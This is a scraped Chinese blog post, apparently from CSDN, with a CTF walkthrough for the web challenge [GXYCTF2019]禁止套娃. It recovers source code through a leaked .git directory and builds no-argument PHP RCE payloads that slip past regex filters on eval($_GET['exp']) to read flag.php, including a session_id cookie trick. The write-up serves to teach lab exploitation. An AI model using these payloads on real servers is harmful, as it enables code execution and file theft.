{"blogid": "123142825", "writerAge": "码龄3年", "writerBlogNum": "88", "writerCollect": "39", "writerComment": "3", "writerFan": "79", "writerGrade": "4级", "writerIntegral": "985", "writerName": "pakho_C", "writerProfileAdress": "writer_image\\profile_123142825.jpg", "writerRankTotal": "19602", "writerRankWeekly": "22597", "writerThumb": "92", "writerVisitNum": "58025", "blog_read_count": "4070", "blog_time": "于 2022-02-26 00:20:23 发布", "blog_title": "[GXYCTF2019]禁止套娃", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p>web第37题<br/> [GXYCTF2019]禁止套娃</p>\n<p>打开靶场<br/> <img alt=\"在这里插入图片描述\" src=\"image\\9cb612584a9d4999b58892b2916debd2.png\"/><br/> 审计源代码无发现，使用dirmap进行目录扫描<br/> <img alt=\"在这里插入图片描述\" src=\"image\\902fad9cd9c5413a9d011ad9f36139c5.png\"/><br/> 发现.git目录，猜测存在.git源码泄露，参考：<br/> <a href=\"https://www.cnblogs.com/linfangnan/p/13600490.html\">CTF-WEB：Git 源码泄露 </a><br/> <a href=\"https://www.cnblogs.com/As-usua1/p/12237058.html\">git文件致源码泄露 </a><br/> 使用githack工具下载到.git文件夹下的index.php文件<br/> <img alt=\"在这里插入图片描述\" src=\"image\\b56784017ac249dfa0383f1e8ade4bbd.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\3df9431ef8e04b73876db8f347e894e2.png\"/><br/> index.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"flag在哪里呢？&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z,_]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token comment\">// echo $_GET['exp'];</span>\n                @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"还差一点哦！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"再好好想想！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"还想读flag，臭弟弟！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// highlight_file(__FILE__);</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>php代码审计，首先就看到@eval($_GET[‘exp’]);代码执行，执行到这一步需要经过3重正则校验<br/> <a href=\"http://c.biancheng.net/view/6246.html\">PHP preg_match()：执行正则表达式匹配</a><br/> <a href=\"https://www.runoob.com/php/php-preg_replace.html\">PHP preg_replace() 函数</a><br/> <a href=\"https://blog.csdn.net/caoyouming0609/article/details/77822919\">php中的== 和===的用法及区别</a></p>\n<p>第一个if过滤了data/filter/php/phar伪协议，不能以伪协议形式直接读取文件<br/> 第二个if参考了大佬的解释：</p>\n<blockquote>\n<p>(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了<code>[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\)</code>,可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子,</p>\n</blockquote>\n<p>第三个if使用正则匹配过滤了et/na/info等关键字，导致get()、phpinfo()等函数不能使用</p>\n<p>payload知识点<br/> 1.localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\aaf0552ee347490fb36a13fd6fc1cd53.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\779a5c5bfe504fecae5c9c5cc6f053db.png\"/><br/> 可以看到数组返回的第一个就是.<br/> 2.current() 函数返回数组中的当前元素的值。<br/> 每个数组中都有一个内部的指针指向它的\"当前\"元素，初始指向插入到数组中的第一个元素。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2807977ea8254216ad7e2fdfbe4d48f9.png\"/><br/> 取出数组的第一个元素的值即为.<br/> 3.scandir列出指定目录中的文件和目录，当参数为.时，即列出当前目录的文件</p>\n<p>构造payload读取当前目录下的文件：</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>exp<span class=\"token operator\">=</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\883aeae5dc99402082612e4c40f59a22.png\"/><br/> 读取到当前目录下存在flag.php文件<br/> 思考如何读取flag.php文件内容<br/> 4.array_reverse()函数以相反的元素顺序返回数组。</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>exp<span class=\"token operator\">=</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ad414b60aa1b46798273439d6fe0f98b.png\"/><br/> 5.next()函数讲内部指针指向数组中的下一个元素，并输出</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>exp<span class=\"token operator\">=</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cc72fe22b4cc41c9a27fa53feeb125c2.png\"/><br/> 6.highlight_file将代码高亮显示出来</p>\n<p><strong>最终payload：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>exp<span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\707287ec7e294020b104d5040fb01d8a.png\"/></p>\n<p>其他解法：session_id()实现任意文件读取<br/> 参考：<a href=\"https://blog.csdn.net/qq_45570082/article/details/106602261\">无参数rce</a><br/> <a href=\"https://www.cnblogs.com/LLeaves/p/12868440.html\">[GXYCTF2019]禁止套娃(无参RCE）</a></p>\n<blockquote>\n<p>session_id可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，而flag.php符合条件.<br/> 因此我们在请求包中cookie:PHPSESSID=flag.php,使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br/> session_id()可以获取到当前的session id。<br/> 这样可以构造payload:?exp=readfile(session_id(session_start()));<br/> 达到任意文件读取的效果：</p>\n</blockquote>\n<p>即使用session_id获得了PHPSESSID的值flag.php，再使用readfile函数进行文件读取，在此之前需要开启session，即使用session_start()</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\1574005287064313bc23a564cef6b813.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}